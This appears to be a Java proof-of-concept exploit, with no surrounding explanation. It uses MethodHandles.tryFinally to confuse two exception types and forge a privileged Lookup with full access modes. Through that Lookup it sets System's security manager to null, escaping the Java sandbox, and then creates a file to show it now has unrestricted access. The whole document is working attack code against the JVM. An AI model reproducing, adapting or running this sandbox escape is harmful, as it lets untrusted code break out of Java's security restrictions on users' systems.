import java.io.File;
import java.io.IOException;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.invoke.MethodHandles.Lookup;
import java.lang.reflect.Field;

public class CreateFile {
    public static void throwEx() throws BadCast1 {
        throw new BadCast1();
    }

    public static void handleEx(BadCast2 e) {
        e.lm.allowedModes = -1;

        // Type confusion attack
        try {
            BadCast1 castedObject = (BadCast1)(Object) e;
            MethodHandles.Lookup lookup = (MethodHandles.Lookup) castedObject.o1;
            MethodHandle setSecurityManager = lookup.findStaticSetter(System.class, "security", SecurityManager.class);
            // Set the security manager to null
            setSecurityManager.invokeExact((SecurityManager) null);
            System.out.println("Security manager set to null.");
        } catch (Throwable f) {
            System.err.println("Error: " + f);
        }
    }

    public class LookupMirror {
        Class<?> lookupClass;
        int allowedModes;
    }

    public static class BadCast1 extends Throwable{
        Object o1 = MethodHandles.publicLookup();
    }

    public static class BadCast2 extends Throwable{
        LookupMirror lm;
    }

    public static void main(String[] args) throws Throwable {

        // Create a method handle
        MethodHandles.Lookup lookup = MethodHandles.lookup();
        MethodHandle throwEx = lookup.findStatic(CreateFile.class, "throwEx", MethodType.methodType(void.class));
        MethodHandle handleEx = lookup.findStatic(CreateFile.class, "handleEx",
                MethodType.methodType(void.class, BadCast2.class));
        MethodHandle tryFinally = MethodHandles.tryFinally(throwEx, handleEx);

        // Call the method handle
        try {
            tryFinally.invokeExact();
        } catch (Throwable e) {
            System.out.println("Error: " + e);
        }

        // Create a file
        try {
            File file = new File("example.txt");

            if (file.createNewFile()) {
                System.out.println("File created: " + file.getName());
            } else {
                System.out.println("File already exists.");
            }
        } catch (IOException e) {
            System.out.println("An error occurred.");
            e.printStackTrace();
        }
        
    }
}